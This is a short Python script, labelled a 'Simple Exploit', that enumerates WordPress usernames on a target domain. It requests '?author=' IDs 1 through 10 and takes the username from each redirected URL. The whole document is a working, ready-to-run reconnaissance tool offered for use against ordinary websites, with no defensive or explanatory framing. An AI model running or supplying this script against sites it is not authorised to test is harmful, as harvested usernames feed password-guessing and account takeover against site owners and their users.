## WordPress User Disclosure
##Simple Exploit
import requests
import sys


header = {"User-Agent":"Venera/1.0"}

def help():
	print("""
WordPress User Disclosure
     Simple Exploit     
-------------------------
python3 wpud.py example.com
		""")
def ue(url,header):
    print("WordPress User Disclosure\n'?author=' Method")
    userlist = []
    ul = ["1","2","3","4","5","6","7","8","9","10"]
    for u in ul:
        try:
            req0 = url + "/?author=" + u
            req1 = requests.get(req0, headers=header)
            user = req1.url
            user = user.split("/")
            userlist.append(user[4])
        except:
            break

    if len(userlist) == 0:
        print("[+] -",url)
        print("[!] - No User Found.")
    else:
        print("[+] - ",len(userlist),"User Found.\n")
        for l in userlist:
            print(l)

try:
    ur0 = sys.argv[1]
    if "http" in ur0:
        help()
    else:
        try:
            url = "http://" + ur0
            ue(url, header)
        except:
            print("[!] - Error")
except:
    help()

